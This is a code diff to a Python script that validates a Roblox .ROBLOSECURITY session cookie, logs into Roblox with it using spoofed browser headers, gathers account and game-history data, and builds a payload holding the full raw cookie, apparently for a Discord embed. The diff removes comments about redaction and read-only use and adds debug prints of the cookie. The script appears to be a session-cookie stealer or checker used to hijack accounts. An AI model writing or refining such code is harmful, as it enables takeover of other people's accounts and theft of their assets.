@@ -8,34 +8,36 @@ def validate_and_clean_cookie(raw_input):
     Strictly validates and cleans the cookie:
     - Removes whitespace, surrounding quotes, and .ROBLOSECURITY= prefix
     - Verifies it starts with the mandatory Roblox warning string
-    - Verifies it contains only printable ASCII characters (preventing encoding crashes)
+    - Verifies it contains only printable ASCII characters
     """
     if not raw_input:
         raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
 
-    cookie = str(raw_input).strip()
+    step1 = str(raw_input).strip()
+    print(f"DEBUG: Step 1 (Received) -> Length: {len(step1)}, Start: {step1[:12]}...", file=sys.stderr)
 
     # Strip wrapping quotes if present
-    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
-        cookie = cookie[1:-1].strip()
+    if (step1.startswith('"') and step1.endswith('"')) or (step1.startswith("'") and step1.endswith("'")):
+        step1 = step1[1:-1].strip()
 
     # Strip .ROBLOSECURITY= prefix if included
-    if cookie.startswith(".ROBLOSECURITY="):
-        cookie = cookie[len(".ROBLOSECURITY="):].strip()
+    if step1.startswith(".ROBLOSECURITY="):
+        step1 = step1[len(".ROBLOSECURITY="):].strip()
 
-    # Strip trailing semicolons or whitespace
-    cookie = cookie.rstrip(';').strip()
+    step2 = step1.rstrip(';').strip()
+    print(f"DEBUG: Step 2 (After stripping) -> Length: {len(step2)}, Start: {step2[:12]}...", file=sys.stderr)
 
     # Mandatory Roblox warning check
     expected_prefix = "_|WARNING:-DO-NOT-SHARE-THIS"
-    if not cookie.startswith(expected_prefix):
+    if not step2.startswith(expected_prefix):
         raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
 
-    # Strict printable ASCII check (prevents latin-1 encoding errors on corrupted/encrypted strings)
-    if not all(32 <= ord(c) < 127 for c in cookie):
+    # Strict printable ASCII check
+    if not all(32 <= ord(c) < 127 for c in step2):
         raise ValueError("Invalid cookie format: paste the raw .ROBLOSECURITY value from your browser.")
 
-    return cookie
+    print(f"DEBUG: Step 3 (Before validation) -> Length: {len(step2)}, Start: {step2[:12]}...", file=sys.stderr)
+    return step2
 
 def main():
     try:
@@ -52,7 +54,7 @@ def main():
         
         raw_arg = sys.argv[1]
 
-        # Validate and sanitize cookie before any network requests are made
+        # Validate and sanitize cookie
         try:
             roblosecurity = validate_and_clean_cookie(raw_arg)
         except ValueError as ve:
@@ -62,11 +64,8 @@ def main():
         print("DEBUG: Cookie validation passed successfully.", file=sys.stderr)
 
         session = requests.Session()
-        
-        # Set cookie strictly in the cookie jar for the correct domain
         session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
         
-        # Realistic local machine browser headers
         session.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
             "Accept": "application/json, text/plain, */*",
@@ -75,7 +74,7 @@ def main():
             "Origin": "https://www.roblox.com/"
         })
 
-        # Direct authentication check (no extra logout calls or destructive requests)
+        # Direct authentication check
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
@@ -94,7 +93,7 @@ def main():
         username = auth_data.get("name", "Unknown")
         display_name = auth_data.get("displayName", username)
 
-        # --- Standard Fetchers (Read-only API calls) ---
+        # Fetchers
         def get_user_info():
             return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()
 
@@ -191,8 +190,6 @@ def main():
         ps99        = check_played(3259657279)
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-        
-        # Safe redacted cookie block display for Discord embed (never logged to console)
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
